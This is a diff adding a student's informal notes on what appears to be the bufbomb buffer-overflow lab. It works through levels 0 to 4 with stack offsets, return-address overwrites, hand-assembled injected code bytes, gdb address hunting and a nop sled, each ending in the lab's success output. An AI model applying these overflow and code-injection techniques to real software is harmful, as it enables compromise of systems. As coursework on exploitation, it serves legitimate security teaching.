@@ -1,0 +1,190 @@
+get user name div
+
+unix> gcc -m32 -c example.S
+unix> objdump -d example.o > example.d
+
+unix> gdb bufbomb
+(gdb) run -u bovik < exploit-raw.txt
+
+objdump 
+
+level0:
+attack : getbuf
+0x28 = 2 * 16 + 8 = 32 + 8 = 40
+somke : 0x08048c90
+40 + 4 + '90' '8c' '04' '08' '00'
+./hex2raw < smoke.txt > smoke-raw.txt
+./bufbomb -u div < smoke-raw.txt 
+Userid: div
+Cookie: 0x170f72df
+Type string:Smoke!: You called smoke()
+VALID
+NICE JOB!
+
+level1:
+attack : fizz -> 0x08048cba
+first:
+40 + 4 + 'ba' '8c' '04' '08'+ cookie
+and we use div -> 0x170f72df
+second:
++ 'df' '72' '0f' '17' '00'
+mis-> we get cmp 0x804c220 %eax
+so change cookie -> 0x0804c220
+mis-> we look in fizz again
+find that we use push in getbuf and it becames 
+   argc
+return addr
+  old ebp
+we use return addr to jump to fizz, and we push , so:
+   argc
+  old ebp
+but, access to the value is 0x8(%ebp)
+so, we should put the cookie = return addr - 8
+mis-> change back to 'df' '72' '0f' '17'
+./bufbomb -u div < sparkler-raw.txt  
+Userid: div
+Cookie: 0x170f72df
+Type string:Fizz!: You called fizz(0x170f72df)
+VALID
+NICE JOB!
+finish!
+
+level2:
+attack :  bang & global_value
+bang 0x08048d05
+global_value 0x0804c218
+code:
+excute
+movl $0x170f72df, 0x0804c218 
+pushl $0x08048d05
+ret
+we need to cov it to bin
+and all we have decided is that we turn the first code to our string
+so must get the pos of the beginning of the string 
+method:
+set b *0x080491f5
+info all-registers
+get eax = 0x55683b08
+
+use gcc and objdump to get the bin code
+c7 05 18 c2 04 08 df    movl   $0x170f72df,0x804c218
+72 0f 17 
+68 05 8d 04 08          push   $0x8048d05
+c3 
+
+fill it into text file
+./bufbomb -u div < firecracker-raw.txt 
+Userid: div
+Cookie: 0x170f72df
+Type string:Bang!: You set global_value to 0x170f72df
+VALID
+NICE JOB!
+finish!
+
+level3:
+I think it is easy than level2
+just the same with before
+test -> getbuf -> 0x08048e81
+code:
+mov $0x170f72df, %eax
+push $0x08048e81
+ret
+bin:
+b8 df 72 0f 17          mov    $0x170f72df,%eax
+68 81 8e 04 08          push   $0x8048e81
+c3  
+
+set to 0x55683b08
+first -> ebp 0x55683b30
+mis ->
+we also use x/x $ebp -> old_value!! 0x55683b60
+./bufbomb -u div < dynamite-raw.txt  
+Userid: div
+Cookie: 0x170f72df
+Type string:Boom!: getbuf returned 0x170f72df
+VALID
+NICE JOB!
+finish!
+
+level4:
+according to the hint, we know we should use nop to take the place of '41'
+nop = '90'
+in order to make sure that the program lost itself into our string-code
+we should set the last 4 positon, and set the real code to our test
+with the ebp no change, we will reset the return addr
+in the other way, we will use 512 bytes-length string to take place of the former one
+
+
+get cookie
+return change 0x08048e15
+
+test eax = 0x55683928 0x55683998 0x556838d8 0x55683948 
+testcase:
+ebp, esp:
+55683b30 55683918
+55683ba0 55683988
+55683ae0 556839c8
+old_value:
+55683b60 55683b38
+55683bd0 55683ba8
+55683b10 55683ae8
+code:
+lea 0x24(%esp), %ebp
+movl $0x170f72df, %eax
+push $0x08048e15
+ret
+
+bin:
+8d 6c 24 24
+b8 df 72 0f 17
+68 15 8e 04 08
+c3
+mis:
+the reason must be the esp & ebp
+mis:
+test witj gdb
+recond the runtime
+        esp       ebp
+enter 55683b38  55683b60
+back  55683b38  55683b00
+enter 55683ba8  55683bd0
+back  55683ba8  55683b00
+enter 55683a58  55683b10
+back  55683ae8  55683b00
+
+that's saying that it don't make sence to ebp
+try to change 
+use test.txt
+89 e0
+b9 48 02 00 00
+01 c1
+89 c5
+...
+...
+mis
+back to begin
+code:
+lea 0x28(%esp), %ebp
+movl $0x170f72df, %eax
+push $0x08048e15
+ret
+
+8d 6c 24 28             lea    0x28(%esp),%ebp  
+b8 df 72 0f 17          mov    $0x170f72df,%eax 
+68 15 8e 04 08          push   $0x8048e15       
+c3                      ret
+./bufbomb -n -u div <nitroglycern-raw.txt 
+Userid: div
+Cookie: 0x170f72df
+Type string:KABOOM!: getbufn returned 0x170f72df
+Keep going
+Type string:KABOOM!: getbufn returned 0x170f72df
+Keep going
+Type string:KABOOM!: getbufn returned 0x170f72df
+Keep going
+Type string:KABOOM!: getbufn returned 0x170f72df
+Keep going
+Type string:KABOOM!: getbufn returned 0x170f72df
+VALID
+NICE JOB!
+finish!
